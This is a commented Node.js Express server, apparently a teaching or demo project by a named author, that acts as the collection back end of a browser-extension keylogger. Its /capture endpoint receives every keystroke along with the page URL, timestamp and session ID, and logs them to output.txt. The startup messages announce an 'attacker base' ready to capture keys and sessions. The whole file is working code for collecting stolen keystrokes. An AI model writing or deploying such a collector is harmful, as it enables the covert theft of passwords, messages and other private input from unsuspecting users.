const express = require('express'); //  The framework that allows this script to act as a "Server" to receive browser data.
const cors = require('cors');       // Browsers block scripts from talking to local files; CORS "unblocks" this so the extension can send data.
const fs = require('fs');           // The 'File System' module is the only way Node.js can create and write to 'output.txt'.
const app = express();

app.use(cors()); // Activates the "unblock" rule so Chrome doesn't throw a "Security Error."
app.use(express.json()); // Tells the server to translate the incoming data from a raw "bitstream" into a readable Javascript Object.

// This is the "Capture Endpoint." Every time you press a key, the extension "hits" this URL.
app.post('/capture', (req, res) => {
    const log = req.body; // This variable now holds the Key, the URL, and the Timestamp.
    
    // A 'Session' helps you identify which browser tab the data came from. 
    // If you don't have a session ID from the extension, we use the IP address.
    const sessionId = log.sessionId || req.ip; 

    // We format the raw key so special keys (Space, Enter) are readable in a text file.
    let displayKey = log.key;
    if (displayKey === " ") displayKey = "[SPACE]";
    if (displayKey === "Enter") displayKey = "[ENTER]\n"; // Adds a physical new line in the text file when you hit Enter.
    if (displayKey === "Backspace") displayKey = "[BACK]";

    // This creates the "Row" of data for our log. 
    // FORMAT: [TIME] [SESSION] [WEBSITE] -> KEY
    const logEntry = `[${log.timestamp}] [SESS:${sessionId}] [URL:${log.url}] -> ${displayKey}\n`;

    // This prints the data to your terminal window so you can see the "Attack" happening live.
    console.log(`Captured from ${log.url}: ${displayKey}`);

    // 'appendFile' is used instead of 'writeFile'. 
    // 'writeFile' deletes the file and starts over; 'appendFile' adds new keys to the bottom of the existing list.
    fs.appendFile('output.txt', logEntry, (err) => {
        if (err) {
            // If the hard drive is full or the file is locked, this tells you why.
            console.error("❌ ERROR: Could not save to output.txt", err);
        }
    });

    // Sends a "200 OK" status back to Chrome so the extension knows the data was safely stored.
    res.sendStatus(200); 
});

// Tells the script to stay "awake" and listen on Port 3000.
app.listen(3000, () => {
    console.log("🚀 ATTACKER BASE ONLINE");
    console.log("created by dasa krishna chaitanya")
    console.log("-----------------------------------------");
    console.log("LOGGING TO: output.txt");
    console.log("READY TO CAPTURE KEYS AND SESSIONS...");
});
